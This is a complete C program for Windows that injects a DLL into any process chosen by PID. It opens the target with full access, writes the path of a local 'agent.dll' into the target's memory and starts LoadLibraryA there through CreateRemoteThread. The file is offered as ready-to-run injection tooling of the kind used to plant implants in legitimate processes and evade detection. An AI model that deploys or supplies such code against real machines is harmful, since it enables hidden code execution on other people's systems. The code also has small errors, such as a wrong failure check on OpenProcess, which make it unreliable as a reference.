#include <stdio.h>
#include "windows.h"

int example_loadlibrary(int pid) {

	char currentDir[MAX_PATH];
	SIZE_T bytesWritten = 0;

	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
	if (processHandle == INVALID_HANDLE_VALUE) {
		printf("[X] Error: Could not open process with PID %d\n", pid);
		return 1;
	}

	void *alloc = VirtualAllocEx(processHandle, 0, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (alloc == NULL) {
		printf("[X] Error: Could not allocate memory in process\n");
		return 1;
	}

	void *_loadLibrary = (void *)GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryA");
	if (_loadLibrary == NULL) {
		printf("[X] Error: Could not find address of LoadLibrary\n");
		return 1;
	}

	GetCurrentDirectoryA(MAX_PATH, currentDir);
	strcat(currentDir, "\\agent.dll");

	printf("[*] Injecting path to load DLL: %s\n", currentDir);

	if (!WriteProcessMemory(processHandle, alloc, currentDir, strlen(currentDir) + 1, &bytesWritten)) {
		printf("[X] Error: Could not write into process memory\n");
		return 2;
	}
	printf("[*] Written %d bytes\n", bytesWritten);

	if (CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)_loadLibrary, alloc, 0, NULL) == NULL) {
		printf("[X] Error: CreateRemoteThread failed [%d] :(\n", GetLastError());
		return 2;
	}
	return 0;
}

int main(int argc, char** argv) {
	if (argc != 2) {
		printf("Please provide pid to inject into!");
		return 1;
	}
	else {
		printf("[+] Injecting into: %s", argv[1]);
		int pid = atoi(argv[1]);
		example_loadlibrary(pid);
		return 0;
	}
}